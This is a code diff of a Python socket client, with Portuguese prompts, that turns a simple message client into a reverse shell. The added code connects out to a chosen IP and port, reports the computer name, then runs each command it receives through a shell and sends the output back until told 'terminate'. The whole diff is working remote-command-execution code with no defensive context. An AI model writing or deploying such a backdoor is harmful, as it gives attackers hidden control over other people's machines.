@@ -1,25 +1,32 @@
+#client
+#!/usr/bin/python
+#-*-coding:utf-8-*-
+
 import socket
+import subprocess
+import os
 
-ip = input("Insira o endereco IP: ")
-port = input("Insira a porta: ")
+host = input("Insira o endereco IP: ")
+port = int(input("Insira a porta: "))
 
-def main():
-    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    address = (ip, int(port))
-    sock.connect(address)
-
-    msg = sock.recv(1024)
-
-    print(msg.decode())
+def connecta():
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((host, port))
+    print("[!] Connection Estabilished")
+    s.send(os.environ['COMPUTERNAME'])
 
     while True:
-        msg = input("$ ")
+        command = s.recv(1024)
         
-        # Fazer padding na mensagem se o comprimento for inferior a 80
-        if len(msg) < 80:
-            msg = msg + " " * (80 - len(msg))
-        sock.send(msg.encode())
+        if('terminate' in command):
+            s.close()
+            break
 
-        response = sock.recv(80)
-        print(response.decode())
+        else:
+            CMD = subprocess.Popen(command, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr= subprocess.PIPE, shell=True)
+            s.send(CMD.stdout.read())
+            s.send(CMD.stderr.read())
+            
+def main():
+    connecta()
 main()
